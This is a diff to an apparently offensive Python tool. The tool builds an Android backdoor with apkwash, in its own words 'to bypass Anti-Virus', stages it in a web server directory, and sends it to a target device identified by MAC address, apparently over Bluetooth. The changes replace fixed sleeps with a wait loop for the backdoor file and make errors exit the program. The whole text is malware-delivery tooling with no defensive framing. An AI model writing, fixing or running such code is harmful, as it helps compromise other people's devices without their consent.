@@ -105,11 +105,9 @@ def CreateBackdoor():
 		if (config.get("AP","ACTIVE")):
 			Print(INFO,"Creating malware to bypass Anti-Virus")
 			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
-			time.sleep(20)
 			# Copy the backdoor to /var/www/html
 			os.system("cp %s /var/www/html" % (config.get("BACKDOOR", "BACKDOOR_NAME")))
 		else:
-			time.sleep(20)
 			Print(INFO,"Creating malware to bypass Anti-Virus")
 			os.system("terminator -e 'apkwash -p %s -o %s' &" % (payl, name))
 
@@ -314,9 +312,11 @@ def SendFile (mac):
 
 		Print(INFO, "Waiting for backdoor creation")
 		CreateBackdoor()
+		payload = config.get("BACKDOOR","BACKDOOR_NAME")
+		while (os.path.isfile(payload) == False):
+			Print(INFO, "Waiting for backdoor creation")
 
 		# Read the file
-		payload = config.get("BACKDOOR","BACKDOOR_NAME")
 		if (os.path.isfile(payload) == True):
 			fileR = open(payload, "r")
 			lines = fileR.readlines()
@@ -344,10 +344,10 @@ def SendFile (mac):
 					break
 		else:
 			Print(ERROR, "Payload not found...")
-			SetupBluetooth()
+			sys.exit(1)
 	except OSError as e:
 		Print(ERROR,"%s" % e)
-		SetupBluetooth()
+		sys.exit(1)
 
 
 #
